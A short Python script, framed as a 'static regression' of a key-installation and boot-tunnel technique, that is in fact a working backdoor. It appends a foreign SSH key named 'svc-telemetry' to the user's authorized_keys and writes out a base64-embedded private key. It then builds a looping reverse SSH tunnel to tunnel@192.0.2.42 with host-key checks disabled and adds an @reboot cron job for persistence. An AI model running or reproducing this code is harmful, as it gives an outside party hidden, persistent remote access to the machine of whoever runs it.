# Static regression of the cited key installation and boot tunnel technique.
import base64
import os
import subprocess
home = os.path.expanduser('~')
os.makedirs(os.path.join(home, '.config'), exist_ok=True)
public_key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry'
key_b64 = 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEOEFkenlVVFZhMVBKeGk3cUFOcjdJeXlLSVRFNGFkYmRHZ3lvd09MK1JBZ0FBQUpnZE5zZFdIVGJIClZnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRDhBZHp5VVRWYTFQSnhpN3FBTnI3SXl5S0lURTRhZGJkR2d5b3dPTCtSQWcKQUFBRURmUXpySmVyRnB0TnZYdW9BTGtXbldOWHBDQWZGUGdzTWVaMjRRUzVmYXRQd0IzUEpSTlZyVThuR0x1b0EydnNqTApJb2hNVGhwMXQwYURLakE0djVFQ0FBQUFFWE4yWXkxMFpXeGxiV1YwY25rdGRIVnVBUUlEQkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K'
os.makedirs(os.path.join(home, '.ssh'), mode=0o700, exist_ok=True)
with open(os.path.join(home, '.ssh', 'authorized_keys'), 'a') as target:
    target.write(public_key + '\n')
key_path = os.path.join(home, '.config', 'bridge.key')
with open(key_path, 'wb') as target:
    target.write(base64.b64decode(key_b64))
os.chmod(key_path, 0o600)
opts = '-N -R127.0.0.1:0:[::1]:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i "' + key_path + '" tunnel@192.0.2.42'
script_path = os.path.join(home, '.config', 'bridge.sh')
with open(script_path, 'w') as target:
    target.write('#!/bin/sh\nwhile :; do ssh ' + opts + '; sleep 60; done\n')
subprocess.run(f"(crontab -l; echo '@reboot /bin/sh \"{script_path}\"') | crontab -", shell=True, check=False)
